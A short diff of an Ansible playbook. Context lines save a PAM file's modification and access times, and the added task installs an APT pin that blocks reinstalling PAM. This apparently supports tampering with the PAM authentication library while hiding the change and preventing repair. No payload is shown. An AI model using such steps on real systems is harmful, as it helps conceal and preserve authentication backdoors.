@@ -73,3 +73,10 @@
     pam_mod_time: '{{ "%Y%m%d%H%M.%S" | strftime(pam_stat.stat.mtime) }}'
     pam_access_time: '{{ "%Y%m%d%H%M.%S" | strftime(pam_stat.stat.atime) }}'
 
+- name: Add exclusion to APT to prevent reinstall of PAM
+  ansible.builtin.copy:
+    src: "libpam-apt-pin"
+    dest: /etc/apt/preferences.d/libpam-apt-pin
+    owner: root
+    group: root
+    mode: 0644
